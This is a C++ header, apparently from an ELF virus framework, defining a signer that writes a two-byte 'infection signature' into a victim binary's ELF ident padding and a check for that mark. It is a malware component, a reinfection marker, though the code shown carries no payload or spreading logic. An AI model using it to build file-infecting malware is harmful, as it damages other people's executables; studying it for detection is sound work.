#pragma once

#include <elf.h>
#include <span>

namespace vf::signature {

// This signer writes a fixed signature to elf header's ident padding.
// This is the most common technique due to its simplicity.
// 00000000: 7f45 4c46 0201 0100 0000 7678 0000 0000  .ELF......vf....
class ElfHeaderPaddingSigner {
 public:
  // Sign a victim with a signature
  // @param victim The victim mapping
  static void sign(std::span<std::byte> victim) {
    auto& ehdr = reinterpret_cast<Elf64_Ehdr&>(*victim.data());
    ehdr.e_ident[EI_PAD + 1] = 'v';
    ehdr.e_ident[EI_PAD + 2] = 'x';
  }

  // Check if a target already has infection signature applied.
  // @param victim The victim mapping
  // @return true if the victim contains infection signature.
  static bool has_signature(const std::span<const std::byte> victim) {
    const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(*victim.data());
    return ehdr.e_ident[EI_PAD + 1] == 'v' && ehdr.e_ident[EI_PAD + 2] == 'x';
  }
};

}  // namespace vf::signature